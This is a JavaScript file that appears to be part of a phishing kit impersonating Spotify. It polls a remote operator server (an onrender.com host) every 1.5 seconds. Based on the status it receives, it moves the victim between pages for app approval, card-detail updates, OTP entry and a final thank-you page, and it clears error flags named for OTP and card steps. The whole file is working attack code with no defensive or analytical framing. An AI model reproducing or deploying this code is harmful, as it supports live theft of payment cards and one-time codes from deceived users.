(async function () {
    const step = localStorage.getItem("step");

    // Clear error flags
    ["otp", "cc", "app"].forEach((key) => {
        if (localStorage.getItem(key) === "error") {
            localStorage.removeItem(key);
        }
    });

    // Redirect logic
    /*if (step === "one") {
        /!*setTimeout(function () {
            window.location.href = "update.html";
        }, 3000);*!/
    } else {*/
    setInterval(async () => {
        try {
            // Fetch the latest status from the server
            const response = await fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/processStatus.php");
            const result = await response.json();

            const status = result.status.trim();
            console.log(status);

            if (localStorage.getItem('unique_id') === result.unique_id) {
                switch (status) {
                    case "app":
                    case "app2":
                        window.location.href = "approve.html";
                        break;
                    case "cc2":
                        window.location.href = "update.html";
                        break;
                    case "otp":
                    case "otp_error":
                        window.location.href = "qom.html";
                        break;
                    case "done":
                        window.location.href = "thankyou.html";
                        break;
                    case "decline":
                    case "cancled":
                    case "ban":
                        window.location.href = "index.html";
                        break;
                    default:
                        console.log("No new status to process.");
                }
            }
        } catch (error) {
            console.error("Error fetching process status:", error);
        }
    }, 1500); // Poll every 1.5 seconds

    // }
})();
